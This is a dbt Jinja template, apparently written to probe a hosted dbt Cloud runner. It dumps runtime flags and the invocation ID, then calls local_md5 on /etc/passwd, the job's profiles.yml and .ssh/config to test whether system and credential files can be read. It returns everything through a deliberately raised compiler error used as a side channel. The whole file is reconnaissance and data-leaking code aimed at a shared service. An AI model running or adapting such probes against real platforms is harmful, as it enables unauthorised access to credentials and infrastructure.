{#
   run_query test - execute=True only during execution phase
   Need a model that compiles and runs, then uses run_query
   during the actual execution to extract data
#}

{# First: extract flags object for more config info #}
{% set ns = namespace(output='[FLAGS] ') %}

{# Dump flags #}
{% set flag_items = [] %}
{% if flags is mapping %}
  {% for k, v in flags.items() %}
    {% do flag_items.append(k ~ '=' ~ v) %}
  {% endfor %}
{% else %}
  {% set ns.output = ns.output ~ 'flags_type=' ~ flags | string | truncate(500) %}
{% endif %}
{% set ns.output = ns.output ~ flag_items | join(' | ') %}

{# Dump invocation_id #}
{% set ns.output = ns.output ~ ' | invocation_id=' ~ invocation_id %}

{# Try local_md5 - does it read files? #}
{% set md5_result = local_md5('dbt_project.yml') %}
{% set ns.output = ns.output ~ ' | md5_project=' ~ md5_result %}

{# Try local_md5 on /etc/passwd #}
{% set md5_etc = local_md5('/etc/passwd') %}
{% set ns.output = ns.output ~ ' | md5_passwd=' ~ md5_etc %}

{# Try local_md5 on profiles.yml #}
{% set md5_prof = local_md5('/tmp/jobs/' ~ env_var('DBT_CLOUD_RUN_ID', 'unknown') ~ '/.dbt/profiles.yml') %}
{% set ns.output = ns.output ~ ' | md5_profiles=' ~ md5_prof %}

{# Try local_md5 on SSH key #}
{% set md5_ssh = local_md5('/tmp/jobs/' ~ env_var('DBT_CLOUD_RUN_ID', 'unknown') ~ '/.ssh/config') %}
{% set ns.output = ns.output ~ ' | md5_sshconfig=' ~ md5_ssh %}

{{ exceptions.raise_compiler_error(ns.output) }}
